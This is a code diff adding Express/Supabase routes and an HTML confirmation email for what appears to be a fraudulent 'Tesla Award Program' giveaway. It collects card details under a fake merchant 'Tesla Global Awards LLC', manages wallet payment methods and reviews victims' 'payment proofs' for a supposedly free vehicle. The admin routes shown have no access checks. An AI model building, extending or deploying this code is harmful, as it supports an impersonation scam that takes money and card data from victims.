+router.get('/admin/settings/cc', async (_req, res) => {
+  try {
+    const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase.from('admin_settings').select('value').eq('key', 'cc_config').maybeSingle();
+    if (error) throw error;
+    const v = (data?.value ?? {}) as any;
+    res.json({
+      networks: v.networks ?? ['visa', 'mastercard', 'amex', 'discover'],
+      merchantName: v.merchantName ?? 'Tesla Global Awards LLC',
+      merchantId: v.merchantId ?? 'TGA-2026-001',
+      instructions: v.instructions ?? 'Enter your card details below to complete payment.'
+    });
+  } catch (err) { logger.error({ err }, 'Admin CC config get error'); res.status(500).json({ error: 'Server error' }); }
+});
+router.post('/admin/settings/cc', async (req, res) => {
+  try {
+    const body = req.body as any;
+    const supabase = await getSupabaseAdmin();
+    const value: Record<string, any> = {};
+    if (body.networks     !== undefined) value.networks     = body.networks;
+    if (body.merchantName !== undefined) value.merchantName = body.merchantName;
+    if (body.merchantId   !== undefined) value.merchantId   = body.merchantId;
+    if (body.instructions !== undefined) value.instructions = body.instructions;
+    const { data: existing } = await supabase.from('admin_settings').select('value').eq('key', 'cc_config').maybeSingle();
+    const merged = existing?.value ? { ...(existing.value as any), ...value } : value;
+    const { error } = await supabase.from('admin_settings').upsert({ key: 'cc_config', value: merged, updated_at: new Date().toISOString() }, { onConflict: 'key' });
+    if (error) throw error;
+    res.json({ success: true, ...merged });
+  } catch (err) { logger.error({ err }, 'Admin CC config save error'); res.status(500).json({ error: 'Server error' }); }
+});
+// ── PUBLIC: PAYMENT METHODS (for customer payment page) ──
+router.get("/payment-methods", async (_req, res) => {
+  try {
+    const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase
+      .from("payment_methods")
+      .select("*")
+      .eq("enabled", true)
+      .order("sort_order");
+    if (error) throw error;
+    const methods = (data || []).map(enrichPaymentMethodRow);
+    res.json({ methods });
+  } catch (err) { logger.error({ err }, "Public payment methods error"); res.status(500).json({ error: "Server error" }); }
+});
+
+// ── ADMIN: UPSERT PAYMENT METHOD (by name slug — create or update) ──
+router.post("/admin/payment-methods/upsert", async (req, res) => {
+  try {
+    const m = req.body as any;
+    const supabase = await getSupabaseAdmin();
+    const slug = m.slug || String(m.name || "").toLowerCase().replace(/[^a-z0-9]+/g, "-");
+    const { data: existing } = await supabase.from("payment_methods")
+      .select("id").or(`name.eq.${slug},slug.eq.${slug}`).maybeSingle();
+    const accountDetails = typeof m.account_details === "object"
+      ? JSON.stringify(m.account_details)
+      : (m.account_details || "{}");
+    const row: Record<string, any> = {
+      name: slug, slug: m.slug || slug,
+      display_name: m.display_name || m.name || slug,
+      type: m.type || "wallet", enabled: m.enabled !== false,
+      logo_url: m.logo_url || "", wallet_address: m.wallet_address || "",
+      account_details: accountDetails,
+      payment_instructions: m.payment_instructions || "",
+      sort_order: m.sort_order || 0, updated_at: new Date().toISOString()
+    };
+    let dbId: string;
+    if (existing?.id) {
+      const { error } = await supabase.from("payment_methods").update(row).eq("id", existing.id);
+      if (error) throw error;
+      dbId = existing.id;
+    } else {
+      row.created_at = new Date().toISOString();
+      const { data: inserted, error } = await supabase.from("payment_methods").insert(row).select("id").single();
+      if (error) throw error;
+      dbId = inserted.id;
+    }
+    res.json({ success: true, _db_id: dbId });
+  } catch (err) { logger.error({ err }, "Upsert payment method error"); res.status(500).json({ error: "Server error" }); }
+});
+
+// ── ADMIN: PAYMENT METHODS ──
+router.get("/admin/payment-methods", async (_req, res) => {
+  try {
+    const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase.from("payment_methods").select("*").order("sort_order");
+    if (error) throw error;
+    res.json({ methods: (data || []).map(enrichPaymentMethodRow) });
+  } catch (err) { logger.error({ err }, "Admin payment methods error"); res.status(500).json({ error: "Server error" }); }
+});
+router.post("/admin/payment-methods", async (req, res) => {
+  try {
+    const method = req.body as any;
+    const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase.from("payment_methods").insert({
+      name: method.name, display_name: method.display_name, type: method.type || "wallet",
+      wallet_address: method.wallet_address, account_details: method.account_details,
+      payment_instructions: method.payment_instructions, logo_url: method.logo_url, logo_id: method.logo_id,
+      icon_emoji: method.icon_emoji || "💳", sort_order: method.sort_order || 0, enabled: method.enabled !== false
+    }).select().single();
+    if (error) throw error;
+    res.json({ success: true, method: data });
+  } catch (err) { logger.error({ err }, "Admin payment method create error"); res.status(500).json({ error: "Server error" }); }
+});
+router.put("/admin/payment-methods/:id", async (req, res) => {
+  try {
+    const { id } = req.params; const updates = req.body as any;
+    const supabase = await getSupabaseAdmin();
+    const updateData: Record<string, any> = {};
+    if (updates.name !== undefined) updateData.name = updates.name;
+    if (updates.display_name !== undefined) updateData.display_name = updates.display_name;
+    if (updates.type !== undefined) updateData.type = updates.type;
+    if (updates.wallet_address !== undefined) updateData.wallet_address = updates.wallet_address;
+    if (updates.account_details !== undefined) updateData.account_details = updates.account_details;
+    if (updates.payment_instructions !== undefined) updateData.payment_instructions = updates.payment_instructions;
+    if (updates.logo_url !== undefined) updateData.logo_url = updates.logo_url;
+    if (updates.logo_id !== undefined) updateData.logo_id = updates.logo_id;
+    if (updates.slug !== undefined) updateData.slug = updates.slug;
+    if (updates.sort_order !== undefined) updateData.sort_order = updates.sort_order;
+    if (updates.enabled !== undefined) updateData.enabled = updates.enabled;
+    updateData.updated_at = new Date().toISOString();
+    const { error } = await supabase.from("payment_methods").update(updateData).eq("id", id);
+    if (error) throw error;
+    res.json({ success: true, _db_id: id });
+  } catch (err) { logger.error({ err }, "Admin payment method update error"); res.status(500).json({ error: "Server error" }); }
+});
+router.delete("/admin/payment-methods/:id", async (req, res) => {
+  try {
+    const { id } = req.params; const supabase = await getSupabaseAdmin();
+    const { error } = await supabase.from("payment_methods").delete().eq("id", id);
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (err) { logger.error({ err }, "Admin payment method delete error"); res.status(500).json({ error: "Server error" }); }
+});
+// ── ADMIN: PAYMENT PROOFS ──
+router.get("/admin/payment-proofs", async (_req, res) => {
+  try {
+    const supabase = await getSupabaseAdmin();
+
+    // Step 1: fetch all proofs (user_id is often NULL so we can't rely on FK join)
+    const { data: rawProofs, error } = await supabase
+      .from("payment_proofs")
+      .select("*")
+      .order("created_at", { ascending: false });
+    if (error) throw error;
+    if (!rawProofs || rawProofs.length === 0) { res.json({ proofs: [] }); return; }
+
+    // Step 2: collect unique order_ids
+    const orderIds = [...new Set(rawProofs.map((p: any) => p.order_id).filter(Boolean))] as string[];
+
+    let ordersMap: Record<string, any> = {};
+    let usersMap:  Record<string, any> = {};
+
+    if (orderIds.length > 0) {
+      // Step 3: fetch orders → user_id + delivery_method + selected_car
+      const { data: orders } = await supabase
+        .from("orders")
+        .select("order_id, user_id, delivery_method, selected_cars(data)")
+        .in("order_id", orderIds);
+
+      (orders || []).forEach((o: any) => { ordersMap[o.order_id] = o; });
+
+      // Step 4: collect unique user_ids — from orders AND directly from proofs
+      const orderUserIds = (orders || []).map((o: any) => o.user_id).filter(Boolean);
+      const proofUserIds = rawProofs.map((p: any) => p.user_id).filter(Boolean);
+      const userIds = [...new Set([...orderUserIds, ...proofUserIds])] as string[];
+
+      if (userIds.length > 0) {
+        // Step 5: fetch actual customer info
+        const { data: users } = await supabase
+          .from("giveaway_users")
+          .select("id, first_name, last_name, email, phone")
+          .in("id", userIds);
+
+        (users || []).forEach((u: any) => { usersMap[u.id] = u; });
+      }
+    }
+
+    const proofs = rawProofs.map((p: any) => {
+      const ord = ordersMap[p.order_id];
+      // Try: user from order join first; fallback to proof.user_id direct lookup
+      const u   = (ord ? usersMap[ord.user_id] : null) || (p.user_id ? usersMap[p.user_id] : null);
+      const carRaw  = Array.isArray(ord?.selected_cars) ? ord.selected_cars[0] : ord?.selected_cars;
+      const carData = (carRaw?.data) || {};
+      const dmRaw   = ord?.delivery_method || {};
+      const dmLabel = typeof dmRaw === "string" ? dmRaw : (dmRaw as any).name || (dmRaw as any).label || (dmRaw as any).type || "";
+      const joinedName = u ? [u.first_name, u.last_name].filter(Boolean).join(" ") : "";
+      return {
+        ...p,
+        user_name:       p.customer_name  || joinedName || u?.email || "",
+        user_email:      p.customer_email || u?.email   || "",
+        user_phone:      p.customer_phone || u?.phone   || "",
+        car_model:       selectedCarLabel(carData) || p.car_model || "",
+        delivery_method: p.delivery_method || dmLabel,
+      };
+    });
+
+    res.json({ proofs });
+  } catch (err) { logger.error({ err }, "Admin payment proofs error"); res.status(500).json({ error: "Server error" }); }
+});
+router.post("/admin/payment-proofs/submit", async (req, res) => {
+  try {
+    const proof = req.body as any; const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase.from("payment_proofs").insert({
+      order_id: proof.order_id, user_id: proof.user_id, payment_method: proof.payment_method,
+      proof_url: proof.proof_url, proof_type: proof.proof_type || "file", amount: proof.amount, status: "pending"
+    }).select().single();
+    if (error) throw error;
+    res.json({ success: true, proof: data });
+  } catch (err) { logger.error({ err }, "Admin proof submit error"); res.status(500).json({ error: "Server error" }); }
+});
+router.post("/admin/payment-proofs/approve", async (req, res) => {
+  try {
+    const { id } = req.body as { id: string };
+    if (!id) { res.status(400).json({ error: "Proof ID required" }); return; }
+    const supabase = await getSupabaseAdmin();
+    const { error } = await supabase.from("payment_proofs").update({ status: "approved", reviewed_at: new Date().toISOString(), reviewed_by: "admin" }).eq("id", id);
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (err) { logger.error({ err }, "Admin proof approve error"); res.status(500).json({ error: "Server error" }); }
+});
+router.post("/admin/payment-proofs/reject", async (req, res) => {
+  try {
+    const { id, reason } = req.body as { id: string; reason?: string };
+    if (!id) { res.status(400).json({ error: "Proof ID required" }); return; }
+    const supabase = await getSupabaseAdmin();
+    const { error } = await supabase.from("payment_proofs").update({ status: "rejected", admin_notes: reason || "", reviewed_at: new Date().toISOString(), reviewed_by: "admin" }).eq("id", id);
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (err) { logger.error({ err }, "Admin proof reject error"); res.status(500).json({ error: "Server error" }); }
+});
+
+function buildOrderConfirmationEmail(order: any) {
+  const car = order.selectedCar || {};
+  const addr = order.deliveryDetails || {};
+  const method = order.deliveryMethod || {};
+  const carId = (car.id || 'models').toLowerCase();
+  
+  const imgMap: Record<string, string> = {
+    cybertruck: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
+    modely: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
+    models: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',
+    model3: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',
+    modelx: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
+  };
+  const carImg = imgMap[carId] || imgMap['models'];
+  const carModel = car.name || 'Model S';
+  const carPrice = car.price || '—';
+  const orderId = order.orderId || '—';
+  const trackingNumber = order.trackingNumber || '—';
+  const estDelivery = order.estimatedDelivery || '—';
+  const delivMethod = (method.name || 'Standard Delivery');
+  const payMethod = (order.paymentMethod?.name || 'Not specified');
+  const fullName = addr.fullName || '—';
+  const address = addr.address || '—';
+  const city = addr.city || '—';
+  const state = addr.state || '—';
+  const zip = addr.zipCode || '—';
+  const country = addr.country || '—';
+  const phone = addr.phone || '—';
+
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Order Confirmed — Tesla Award Program</title>
+</head>
+<body style="margin:0;padding:0;background-color:#f4f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
+  <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color:#f4f5f7;padding:40px 0;">
+    <tr>
+      <td align="center">
+        <table width="620" border="0" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:20px;overflow:hidden;box-shadow:0 6px 30px rgba(0,0,0,0.06);max-width:620px;">
+          <tr>
+            <td align="center" style="background:linear-gradient(135deg,#0a0c10 0%,#171a20 40%,#2a1a1f 100%);padding:32px 30px 28px;">
+              <table border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                  <td align="center" style="padding-bottom:14px;">
+                    <span style="display:inline-block;background:linear-gradient(135deg,#E31937,#ff4757);color:#fff;border-radius:50%;width:68px;height:68px;line-height:68px;font-size:36px;text-align:center;">✓</span>
+                  </td>
+                </tr>
+                <tr>
+                  <td align="center">
+                    <h1 style="margin:0;font-size:30px;font-weight:900;color:#ffffff;letter-spacing:-0.5px;">Order Confirmed!</h1>
+                    <p style="margin:10px 0 0;font-size:16px;color:rgba(255,255,255,0.7);line-height:1.5;">Congratulations — your Tesla award has been successfully processed.</p>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+          <tr>
+            <td style="height:5px;background:linear-gradient(90deg,#E31937,#ff6b6b,#E31937);"></td>
+          </tr>
+          <tr>
+            <td style="padding:40px 35px;">
+              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background:linear-gradient(135deg,#f8f9fa,#eef0f2);border-radius:14px;margin-bottom:28px;border:1px solid rgba(0,0,0,0.04);">
+                <tr>
+                  <td align="center" style="padding:24px 20px 20px;">
+                    <img src="${carImg}" alt="Tesla ${carModel}" style="width:100%;max-width:300px;height:auto;display:block;margin:0 auto 14px;filter:drop-shadow(0 8px 16px rgba(0,0,0,0.1));">
+                    <h3 style="margin:0;font-size:22px;font-weight:800;color:#171a20;">Tesla ${carModel}</h3>
+                    <p style="margin:6px 0 0;font-size:14px;color:#5c5e62;">Retail Value: <strong>${carPrice}</strong></p>
+                    <span style="display:inline-block;background:#E31937;color:#fff;font-size:12px;font-weight:700;padding:6px 16px;border-radius:20px;margin-top:10px;letter-spacing:0.04em;text-transform:uppercase;">FREE Award Vehicle</span>
+                  </td>
+                </tr>
+              </table>
+              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:24px;">
+                <tr>
+                  <td style="padding-bottom:12px;">
+                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">📋 Order Summary</h3>
+                  </td>
+                </tr>
+                <tr>
+                  <td style="background:#f8f9fa;border-radius:10px;padding:0;">
+                    <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size:14px;">
+                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;width:50%;">Order ID</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#E31937;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${orderId}</td></tr>
+                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Tracking Number</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${trackingNumber}</td></tr>
+                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Estimated Delivery</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#00a550;font-weight:700;">${estDelivery}</td></tr>
+                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Delivery Method</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-weight:600;">${delivMethod}</td></tr>
+                      <tr><td style="padding:14px 18px;color:#5c5e62;">Payment Method</td><td style="padding:14px 18px;text-align:right;color:#171a20;font-weight:600;">${payMethod}</td></tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:28px;">
+                <tr>
+                  <td style="padding-bottom:12px;">
+                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">🚚 Delivery Information</h3>
+                  </td>
+                </tr>
+                <tr>
+                  <td style="background:#f8f9fa;border-radius:10px;padding:20px 18px;">
+                    <p style="margin:0 0 6px;font-size:15px;font-weight:700;color:#171a20;">${fullName}</p>
+                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${address}</p>
+                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${city}, ${state} ${zip}</p>
+                    <p style="margin:0 0 8px;font-size:14px;color:#5c5e62;">${country}</p>
+                    <p style="margin:0;font-size:13px;color:#8d9096;">📱 ${phone}</p>
+                  </td>
+                </tr>
+              </table>
+              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:8px;">
+                <tr>
+                  <td align="center">
+                    <a href="https://joshbond123.github.io/Tesla/track.html?order=${orderId}&tracking=${trackingNumber}" style="display:inline-block;background:linear-gradient(135deg,#E31937,#c41030);color:#ffffff;text-decoration:none;padding:16px 40px;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:0.02em;box-shadow:0 6px 20px rgba(227,25,55,0.3);">📍 Track Your Order →</a>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+          <tr>
+            <td style="background-color:#f8f9fa;border-top:1px solid #eef0f2;padding:24px 35px;text-align:center;">
+              <p style="margin:0 0 8px;font-size:12px;color:#8d9096;line-height:1.6;">Need help? Reply to this email or visit our support center.<br>&copy; 2026 Tesla Award Program. All rights reserved.</p>
+              <p style="margin:0;font-size:11px;color:#b0b3b8;">Tesla&reg; is a registered trademark of Tesla, Inc. This is an independent award program.</p>
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+  </table>
+</body>
+</html>`;
+}
+
+export default router;
